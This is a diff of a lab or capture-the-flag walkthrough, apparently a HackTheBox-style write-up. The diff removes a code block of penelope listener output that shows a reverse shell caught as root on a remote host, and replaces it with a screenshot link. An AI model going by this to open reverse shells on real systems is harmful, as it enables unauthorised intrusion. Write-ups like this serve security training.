@@ -623,22 +623,11 @@ So ill start a listener
 
 Ill send the request
 
-```python
-penelope -p 1337   
-[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
-➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] [New Reverse Shell] => 36b733906694 10.129.231.105 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
-[+] Upgrading shell to PTY...
-[+] PTY upgrade successful via /usr/bin/python3
-[+] Interacting with session [1] • PTY • Menu key F12 ⇐
-[+] Session log: /home/kali/.penelope/sessions/36b733906694~10.129.231.105-Linux-x86_64/2026_08_27-19_06_10-666.log
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────
-root@36b733906694:/app# whoami
-root
-root@36b733906694:/app#
-```
+![](Pasted%20image%2020260827190732.png)
 
-I now have a root shell on the ubuntu 
+I now have a root shell on the ubuntu server
+
+
 
 
 
